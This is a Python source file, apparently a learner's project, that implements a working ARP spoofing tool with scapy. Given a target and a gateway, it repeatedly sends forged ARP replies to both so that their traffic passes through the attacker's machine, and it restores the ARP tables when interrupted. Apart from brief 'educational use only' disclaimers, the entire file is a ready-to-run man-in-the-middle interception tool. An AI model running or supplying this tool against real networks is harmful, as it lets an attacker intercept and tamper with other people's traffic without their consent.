#! /usr/bin/env python

#NOTE : This code is for educational purposes only. Unauthorized use may be illegal and unethical. Always obtain permission before testing or intercepting network traffic.
#Always obtain permission before testing or intercepting network traffic.
#You have port forward the packets so the internet works properly after ARP spoofing in your victim machine.

import scapy.all as scapy
import time

def spoof(target_ip, spoof_ip):
    try:
        target_mac = get_mac(target_ip)
        if not target_mac:
            print(f"\n[-] Could not resolve MAC for {target_ip}")
            return

        arp_response = scapy.ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip
        )

        scapy.send(arp_response, verbose=False)

    except PermissionError:
        print("\n[!] Root privileges required. Use sudo.")
        exit(1)

    except Exception as e:
        print(f"\n[!] Spoofing error: {e}")


def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request

        answered_list = scapy.srp(
            arp_request_broadcast,
            timeout=1,
            verbose=False
        )[0]

        if answered_list:
            return answered_list[0][1].hwsrc
        else:
            return None

    except PermissionError:
        print("\n[!] Permission denied!")
        print("[!] Run this script with sudo/root privileges.")
        exit(1)

    except Exception as e:
        print(f"\n[!] Error while getting MAC for {ip}: {e}")
        return None


def restore(destination_ip, source_ip):
    # Get the MAC addresses
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if not destination_mac or not source_mac:
        print(f"[-] Could not find MAC address for {destination_ip} or {source_ip}. Exiting.")
        return

    # Create the ARP response packet to restore the correct mapping
    arp_response = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    
    # Send the packet
    scapy.send(arp_response, count=4, verbose=False)
    print(f"[+] Restored: {source_ip} is-at {source_mac} to {destination_ip}")
    print(f"[+] Restored: {destination_ip} is-at {destination_mac} to {source_ip}")
    print(f"[+] Sent to {destination_ip}: {source_ip} is-at {source_mac}")
    print(f"[+] Sent to {source_ip}: {destination_ip} is-at {destination_mac}")
    print("[+] ARP tables restored. Exiting.")
    print("[+] Exiting.")

def main():
    import argparse

    parser = argparse.ArgumentParser(description="ARP spoofing tool (educational use only)")
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-g", "--gateway", required=True)
    parser.add_argument("-i", "--interval", type=float, default=2.0)
    args = parser.parse_args()

    print("[*] Starting ARP spoofing. Press Ctrl+C to stop.")
    packets = 0

    try:
        while True:
            spoof(args.target, args.gateway)
            spoof(args.gateway, args.target)
            packets += 2
            print(f"\r[+] Packets sent: {packets}", end="")
            time.sleep(args.interval)

    except KeyboardInterrupt:
        print("\n[!] CTRL+C detected. Restoring network...")
        restore(args.target, args.gateway)
        restore(args.gateway, args.target)
        print("[+] Done.")

    except PermissionError:
        print("\n[!] Permission denied. Run as root (sudo).")

    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")



if __name__ == '__main__':
    main()